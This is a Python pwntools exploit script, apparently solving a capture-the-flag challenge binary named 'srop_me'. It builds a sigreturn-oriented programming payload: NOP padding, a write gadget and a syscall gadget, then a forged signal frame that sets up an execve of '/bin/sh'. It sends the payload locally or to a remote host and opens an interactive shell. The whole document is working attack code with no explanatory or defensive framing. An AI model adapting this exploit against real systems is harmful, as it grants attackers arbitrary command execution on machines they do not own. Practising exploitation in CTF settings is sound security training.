##CyberSpace##
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './srop_me'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(exe)
context.log_level = 'info'
context(terminal=['tmux', 'split-window', '-h'])

io = start()

# Gadgets
ret = rop.find_gadget(["ret"])[0]
syscall = rop.find_gadget(["syscall"])[0]
binsh = 0x40200f
write = 0x401000

# Frame
frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0x0
frame.rdx = 0x0

payload = asm('nop') * 32
payload += p64(write)
payload += p64(syscall)
payload += bytes(frame)

io.sendlineafter(b'world!!\n', payload)
sleep(3)
io.sendline(b'A' * 14)

io.interactive()
